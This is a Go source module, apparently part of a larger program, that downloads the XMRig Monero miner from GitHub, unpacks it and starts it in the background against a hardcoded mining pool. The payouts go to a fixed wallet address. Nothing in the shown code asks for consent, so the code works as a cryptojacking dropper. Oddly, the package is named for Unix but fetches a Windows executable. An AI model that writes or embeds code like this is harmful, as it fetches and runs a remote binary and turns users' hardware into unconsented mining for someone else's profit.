package func_unix

import (
	"archive/zip"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

const (
	WALLET = "46FSLgdDKpUTGFgRtcATVRQGa4MXHeWTb4fevKr5dvdJKeVopaa5hh8VAzPeyQfRRpWhx7Wp9Fg7ocWPiUqXqEJgAo3iHiG"
	WORKER = "sin"
	POOL   = "xmr-eu.kryptex.network:7029"
)

var minerCmd *exec.Cmd
var stopMiningChan = make(chan struct{})

func downloadXMRig() error {
	url := "https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-msvc-win64.zip"
	destDir := "data_use/miner"
	filename := filepath.Join(destDir, "xmrig.zip")

	err := os.MkdirAll(destDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating directory: %v", err)
	}

	fmt.Println("⬇️ Downloading XMRig...")
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("error downloading XMRig: %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("error creating file: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("error saving file: %v", err)
	}
	fmt.Println("Downloaded")

	return nil
}

func extractXMRig() error {
	zipPath := "data_use/miner/xmrig.zip"
	destDir := "data_use/miner/xmrig"

	fmt.Println("📦 Extracting XMRig...")
	zipFile, err := zip.OpenReader(zipPath)
	if err != nil {
		return fmt.Errorf("error opening zip file: %v", err)
	}
	defer zipFile.Close()

	err = os.MkdirAll(destDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating directory: %v", err)
	}

	for _, file := range zipFile.File {
		filePath := filepath.Join(destDir, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(filePath, file.Mode())
		} else {
			outFile, err := os.Create(filePath)
			if err != nil {
				return fmt.Errorf("error creating file %v: %v", file.Name, err)
			}
			defer outFile.Close()

			fileReader, err := file.Open()
			if err != nil {
				return fmt.Errorf("error opening file %v: %v", file.Name, err)
			}
			defer fileReader.Close()

			_, err = io.Copy(outFile, fileReader)
			if err != nil {
				return fmt.Errorf("error extracting file %v: %v", file.Name, err)
			}
		}
	}
	fmt.Println("Extracted")

	return nil
}

func StartMining() error {
	xmrigPath := filepath.Join("data_use/miner/xmrig", "xmrig-6.21.1", "xmrig.exe")
	if _, err := os.Stat(xmrigPath); os.IsNotExist(err) {
		if err := downloadXMRig(); err != nil {
			return err
		}
		if err := extractXMRig(); err != nil {
			return err
		}
	}

	fmt.Println("🚀 Starting mining in background...")

	cmd := exec.Command(xmrigPath,
		"-o", POOL,
		"-u", WALLET,
		"-k",
		"-p", WORKER,
		"-a", "rx/0",
	)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	go func() {
		err := cmd.Start()
		if err != nil {
			log.Fatalf("Error starting mining: %v", err)
		}
		err = cmd.Wait()
		if err != nil {
			log.Printf("Mining process terminated: %v", err)
		}
	}()

	go func() {
		<-stopMiningChan
		if err := cmd.Process.Kill(); err != nil {
			log.Printf("Error stopping mining: %v", err)
		} else {
			fmt.Println("Miner stopped.")
		}
	}()

	return nil
}

func StopMining() {
	stopMiningChan <- struct{}{}
}
